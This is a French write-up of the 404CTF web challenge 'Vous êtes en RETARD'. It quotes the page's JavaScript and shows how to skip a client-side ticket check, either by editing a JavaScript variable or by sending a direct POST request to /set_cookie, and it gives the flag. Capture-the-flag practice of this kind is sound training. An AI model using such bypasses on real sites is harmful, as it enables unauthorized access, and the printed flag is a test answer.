# Vous êtes en RETARD
## Enoncé
> Vous voilà devant le stade pour voir le dernier match de votre équipe préférée, le Gorfou FC !
> Malheureusement, vous êtes arrivé.e en retard et l'entrée est fermée... Mais pas de panique, il vous suffit de trouver un moyen pour quand même rentrer !

Auteur: **@Asumamusa**
 
Connexion: `https://en-retard.challenges.404ctf.fr`

## Analyse

On arrive directement sur une page vierge avec un panneau nous signalant une interdiction

<p align="center">
    <img src="../../Platforms/images/404CTFWeb1.png" alt="img1" style="width:40%;">
</p>

En inspectant le code source on tombe sur un script js intéressant:
```javascript
setInterval(function() {
    var panneau = document.querySelector('.panneau');
    var barre = document.querySelector('.barre-en-fer');
    if (!panneau && barre) {
        barre.remove();
    }
}, 100);

document.querySelector('.entrer-dans-le-stade').addEventListener('click', function() {
    window.location.href = '/donnez-moi-mon-ticket-pitie';
});

window.onload = function() {
    var cookies = document.cookie.split('; ');
    var fraudeur = cookies.find(row => row.startsWith('fraude='));

    if (fraudeur && fraudeur.split('=')[1] === 'true') {
        var zoneTexte = document.querySelector('.zone-texte');
        zoneTexte.textContent = 'Vous avez essayé de frauder, mais le vigile vous a aperçu et vous a ramené à l\'entrée...';
        zoneTexte.style.display = 'block';
    }
};
```
On se rend sur le chemin `/donnez-moi-mon-ticket-pitie` et on trouve encore une fois un nouveau script js:
```javascript
var bouton = document.querySelector('.valider-billet');
var billet = document.querySelector('.billet');
window.validable = [];
bouton.addEventListener('click', function() {
    if (window.validable.includes(billet.id)) {
        fetch('/set_cookie', {method: 'POST'}).then(function() {
            window.location.href = "/devant-le-match";
        });
    } else {
        alert('Billet non validé');
    }
});
```
## Exploitation

On peut alors soit modifier la variable `window.validable` pour y inclue un id, soit directement faire une requête POST au chemin `/set_cookie`.
```http
POST /set_cookie HTTP/2
Host: en-retard.challenges.404ctf.fr
Sec-Ch-Ua: "Not-A.Brand";v="99", "Chromium";v="124"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

Le flag est reçu sous forme de cookie en clair `allergies=404CTF{gluten-sucre-au-sucre}`

Flag: **404CTF{gluten-sucre-au-sucre}**